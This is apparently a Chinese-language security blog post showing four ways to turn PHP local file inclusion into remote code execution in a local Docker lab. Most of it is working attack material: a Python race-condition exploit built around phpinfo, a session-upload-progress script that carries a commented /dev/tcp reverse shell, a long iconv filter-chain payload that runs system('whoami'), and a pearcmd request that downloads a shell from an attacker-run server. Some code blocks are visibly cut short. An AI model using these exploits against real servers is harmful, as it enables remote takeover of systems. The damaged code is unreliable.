---
title: Advanced Local File Inclusion to RCE in 2022
date: 2022-05-07T18:32:21+08:00
draft: false
url: "/2022/05/07/advanced-local-file-inclusion-2-rce-in-2022/"
categories:
  - 資訊安全
  - 網頁安全
  - 滲透測試
showToc: true
TocOpen: false
---

蛤，都 2022 年了，還有人不知道 LFI 基本上就 = RCE ㄇ？

還有人 LFI 只會寫 log、努力找上傳檔案的點再來 Include ㄇ？覺得 LFI 就只能 Base64 看看源碼ㄇ？

這篇文整理了一下最近幾年來比較實用的一些 LFI 技巧，透過無腦的貼 POC 就可以快速的 Get Shell。以下我使用 PHP 8.1 apache 做為實驗環境，測試了幾種常見的 RFI to RCE 技巧，理論上在大多數的 PHP 7 底下，預設環境中，不用修改任何的 config 都可以適用。

## Environment Setup

### docker-compose.yml

```yaml
version: "3.7"

services:
  webserver:
    image: php:8.1-apache
    volumes:
        - ./web:/var/www/html
```

### web/index.php

```php
&1'"); ?>'''.format(tag=tag,shell_host=shell_host,shell_port=shell_port)

UPLOAD="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
{}
-----------------------------7dbff1ded0714--\r""".format(PAYLOAD)

padding="A" * 5000

## PHPinfo path
INFOREQ="""POST {phpinfo}?a={padding} HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie={padding}\r
HTTP_ACCEPT: {padding}\r
HTTP_USER_AGENT: {padding}\r
HTTP_ACCEPT_LANGUAGE: {padding}\r
HTTP_PRAGMA: {padding}\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: {len}\r
Host: %s\r
\r
{upload}""".format(phpinfo=PHPinfo_File,padding=padding, len=len(UPLOAD), upload=UPLOAD)

# LFI Path
LFIREQ="GET " +  LFI_File +  """%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""

class PHPINFO_LFI():
    def __init__(self, host, port):
        self.host = host
        self.port = int(port)
        self.req_payload= (INFOREQ % self.host).encode('utf-8')
        self.lfireq = LFIREQ
        self.offset = self.get_offfset()

    def get_offfset(self):
        '''
        获取tmp名字的offset
        '''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.host, self.port))

        s.send(self.req_payload)
        page = b""
        while True:
            i = s.recv(4096)
            page+=i        
            if i == "":
                break

            if i.decode('utf8').endswith("0\r\n\r\n"):
                break
        s.close()

        pos = page.decode('utf8').find("[tmp_name] => ")
        print('get the offset :{} '.format(pos))

        if pos == -1:
            raise ValueError("No php tmp_name in phpinfo output")

        return pos+256 #多加一些字节

    def phpinfo_lfi(self): 
        '''
        同时发送phpinfo请求与lfi请求
        '''
        phpinfo = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        lfi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

        phpinfo.connect((self.host, self.port))
        lfi.connect((self.host, self.port))

        phpinfo.send(self.req_payload)

        infopage = b"" 
        while len(infopage)  ")
        tmpname = infopage[pos+17:pos+31]

        lfireq = self.lfireq % (tmpname.decode('utf8'),self.host)
        lfi.send(lfireq.encode('utf8'))

        fipage = lfi.recv(4096)

        phpinfo.close()
        lfi.close()

        if fipage.decode('utf8').find(tag) != -1:
            return tmpname

if __name__ == '__main__':
    print('{x}Start expolit {host}:{port} {attempts} times{x}'.format(x='*'*15, host=host, port=port, attempts=attempts))

    p = PHPINFO_LFI(host,port)
    for i in range(int(attempts)):
        print('Trying {}/{} times…'.format(i, attempts), end="\r")
        if p.phpinfo_lfi() is not None:
            print("Success!!")
            exit()
    print(':( Failed')
```

## Session Upload Progress

### session.upload_progress

Session Upload Progress 是目前我最愛用的方法，沒有之一。

它不像是前面必須要存在一個 phpinfo ， 任何的預設環境下，它都可以直接使用並輕鬆 Get Shell。

![](https://i.imgur.com/NeTMfWA.png)  
這是一個完全沒有調整過的 PHP info 預設值。

`session.upload_progress` 是 PHP 5.4 以後就有的，預設環境下，`session.upload_progress.enabled` 會是 on，這個功能的發明主要是用來紀錄上傳狀態，例如說有辦法透過這個功能來取得上傳進度條等的功能。

它的規則是，如果 POST 一坨東西，其中有一個 key 叫做 `session.upload_progress.name` 中的值，也就是預設 `PHP_SESSION_UPLOAD_PROGRESS`，而 value 是自訂的內容，此時，PHP會自動在  
Session 中建立一個 `session.upload_progress.prefix` 與我們 post 的 `session.upload_progress.name` 串接的結果。

我相信上面絕對不會有人知道我在公三小 = =，就用一個簡單的例子吧，預設 `session.upload_progress.name` 就是 `PHP_SESSION_UPLOAD_PROGRESS`；預設 `session.upload_progress.prefix` 就是 `upload_progress_`。 如果我們 POST 了一個資料 `PHP_SESSION_UPLOAD_PROGRESS=meowmeow`，則我們會在 Session 中找到一組 key 為 `upload_progress_meowmeow` 的內容，裡面就有 `bytes_processed`、`content_length` 之類的東西可以使用。

PHP 預設會把 Session 寫在以下三個目錄的其中之一，比較新的環境底下大多數都在 `/tmp`，我個人通常會選擇直接瞎猜，失敗了就換一個這樣。

```
/var/lib/php/sessions/sess_{sess_id}
/var/lib/php/session/sess_{sess_id}
/tmp/sess_{sess_id}
```

而這個 Session 檔案的檔名，就會是我們的 Session ID，PHP 的另外一個特性是，如果我們的伺服器根本沒有用到 Session，但是我們手動亂填一個 Session ID 在餅乾，如果伺服器對這個餅乾進行存取或寫入的話，它也會自動的在存 session 的目錄中創一個 Session 檔案，而且是我們自己的 ID 名稱。

Session 檔案內部的結構會是一個 PHP 的反序列化資料，因此直接 strings 是可以存取到裡面的 string 的，因此透過 php 的文件解析特性，前後有垃圾都沒關係，我們只要有辦法好好的把 `` 給包進去就好惹。

因此，我們有辦法自己控制 Session 的檔案名稱、也可以控制一部分的 session 檔案內容，也就是 POST `PHP_SESSION_UPLOAD_PROGRESS`，在裡面寫 php shell code。

### PoC

與前面的 PHPinfo 打法一樣，這是一個處理上傳用的 function，因此當檔案上傳完畢後，這些東西就都會被刪掉了，我們可以透過同時開兩個 thread 來構成 race condition 來 get shell，這邊的 code 我是參考 splitline 提供給我的，目前的 LFI 情境底下，基本上可以百發百中。

```python
import grequests
sess_name = 'meowmeow'
# sess_path = f'/var/lib/php/sessions/sess_{sess_name}'
# sess_path = f'/var/lib/php/session/sess_{sess_name}'
sess_path = f'/tmp/sess_{sess_name}'
base_url = 'http://127.0.0.1:7788/index.php'
param = "f"

# code = "file_put_contents('/tmp/shell.php','& /dev/tcp/172.23.0.1/443 0>&1'");'''

while True:
    req = [grequests.post(base_url,
                          files={'f': "A"*0xffff},
                          data={'PHP_SESSION_UPLOAD_PROGRESS': f"pwned:"},
                          cookies={'PHPSESSID': sess_name}),
           grequests.get(f"{base_url}?{param}={sess_path}")]

    result = grequests.map(req)
    if "pwned" in result[1].text:
        print(result[1].text)
        break
```

## PHP iconv

### 邪教的簡介

這是一個超級噁心的方法，只要我們能透過 LFI 讀到任何一個檔案，而且可以操控 filter 的話，我們就能透過 filter 構造出任意的 Payload。

首先，我們需要知道，任何的 string 如果通過了 `convert.iconv.UTF8.CSISO2022KR` 一定會在最前頭噴出 `\x1b$)C` (`1b 24 29 43`)。

舉例來說

```bash
curl 'http://127.0.0.1:7788/?f=php://filter/convert.iconv.UTF8.CSISO2022KR/resource=/etc/passwd' -s | xxd -l 4
00000000: 1b24 2943                                .$)C

curl 'http://127.0.0.1:7788/?f=php://filter/convert.iconv.UTF8.CSISO2022KR/resource=/etc/hosts' -s | xxd -l 4
00000000: 1b24 2943                                .$)C

curl 'http://127.0.0.1:7788/?f=php://filter/convert.iconv.UTF8.CSISO2022KR/resource=/var/www/html/index.php' -s | xxd -l 4
00000000: 1b24 2943                                .$)C
```

第二個需要知道的是， `convert.base64-decode` 是一個非常寬鬆的東西，如果輸入不是合法的 base64 字串，它就會直接忽略。

意思就是說，如果我們把 `1b24 2943` (`\x1b$)C`) 交給 base64 decode，再用 base64 encode，它的開頭會只剩下 `C`，而後面接的東西會是我們的原始的字串。

```bash
curl 'http://127.0.0.1:7788/?f=php://filter/convert.iconv.UTF8.CSISO2022KR/convert.base64-decode/convert.base64-encode/resource=/etc/passwd' -s | xxd
00000000: 4372 6f6f                                Croo
```

而持續的串不同的 filter，除了 `/` 之外，我們也可以用 `|` 功能是完全一樣的。

```
curl 'http://127.0.0.1:7788/?f=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=/etc/passwd' -s | xxd -l 4
00000000: 4372 6f6f                                Croo
```

知道上面的概念可以湊出一個 `C` 之後，就可以開始來搞事了。

如果輸入以下內容，我們可以獲得一個 `h`

```
php://filter/convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7
```

以下可以得到一個 `i`

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode
```

但要注意順序解析，所以我們要把字串給反過來串，所以我們如果需要有 `hi` 的話，反過來會變成

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=/etc/passwd
```

```bash
curl 'http://127.0.0.1:7788/?f=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7/resource=/etc/passwd' -s | xxd -l 2
00000000: 6869                                     hi
```

到此為止，我們只需要找到所有的 base64 排列組合，湊一個 webshell 並轉成 base64 的狀態，用上面的噁心方法來湊出所有的字元，最終送去給 `convert.base64-encode`，我們就能拿到 Webshell 了。

### PoC

wupco 大神的 repo 也就這樣誕生了 [PHP_INCLUDE_TO_SHELL_CHAR_DICT](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)，因為不同 server 支援的 filter 可能會有差異，所以 fuzzer 可能要自己跑來湊上面的字母排列組合。

以上述的範例環境來看的話，預設 payload 即可直接使用，拿到 webshell， Payload 如下。

```
curl 'http://127.0.0.1:7788/?f=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CN.ISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd&1=system(%22whoami%22);'
'
```

理論上這招跟 session upload progress 類似，可以套用在所有 lfi 的情境中，只需要能控制 include 最前面的字段，只是 payload 真的有點噁心就是了。

## Pear 🍐

### 梨子簡介

最後一個也是一件很常見的情境，我們把原本的 index.php 增加一點點限制，變成 `add_php.php`。

```php
 s.php
python3 -m http.server
```

我們在 php 的 docker 內輸入

```bash
php /usr/local/lib/php/pearcmd.php install -R /tmp http://172.23.0.1:8000/s.php
```

會得到以下的結果

```
downloading s.php ...
Starting to download s.php (27 bytes)
....done: 27 bytes
Could not get contents of package "/tmp/tmp/pear/download/s.php". Invalid tgz file.
Download of "http://172.23.0.1:8000/s.php" succeeded, but it is not a valid package archive
Invalid or missing remote package file
install failed
```

它會自動的幫我們下載檔案到 `/tmp/tmp/pear/download/s.php`，接下來我們只需要 include 它就好。

那在 Web 上面，要怎麼用 LFI 來戳這個呢？

### PHP 預設 arguments

PHP 的 Docker 底下，預設狀態下，`register_argc_argv` 是 on 的

我們可以用以下程式碼來測試 PHP 的 argv 值

```php
 string(3) "aaa" [1]=> string(3) "bbb" }
```

如果我們要在網頁上辦到上面 cmd 上做到的事情，我們需要準備 4 段的 argv

```
install
-R 
/tmp 
http://172.23.0.1:8000/s.php
```

為了避免干擾，我們在第一個 get 參數 (`f`)後面增加一個 GET 參數分隔符號 `&`，並且用 PHP 的 argv 分隔符號 `+` 進行分隔，我們就能操縱到 `pearcmd.php` 了！

### PoC

範例 Code 如下

```
http://127.0.0.1:7788/add_php.php?f=../../../../../../../usr/local/lib/php/pearcmd&+install+-R+/tmp+http://172.23.0.1:8000/s.php
```

Python 的 HTTP Server 可以順利接到 GET 的 Request，而我們的 Shell 也已經好好的被放在 `/tmp/tmp/pear/download/s.php` 中了

接下來只需要用正常的方法 include 進去，就能 Get Shell 了 !!

```
http://127.0.0.1:7788/add_php.php?f=../../../../../../../tmp/tmp/pear/download/s&A=whoami
```

## Conclusion

PHP 有夠噁心 = =

## Reference

[https://hackmd.io/@ginoah/phpInclude  
](https://hackmd.io/@ginoah/phpInclude
)[https://lonmar.cn/2021/07/06/PHP-session-upload-progress/  
](https://lonmar.cn/2021/07/06/PHP-session-upload-progress/
)[https://www.kingkk.com/2018/07/phpinfo-with-LFI/  
](https://www.kingkk.com/2018/07/phpinfo-with-LFI/
)[https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d  
](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d
)[https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT  
](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT
)[https://blog.csdn.net/rfrder/article/details/121042290](https://blog.csdn.net/rfrder/article/details/121042290)
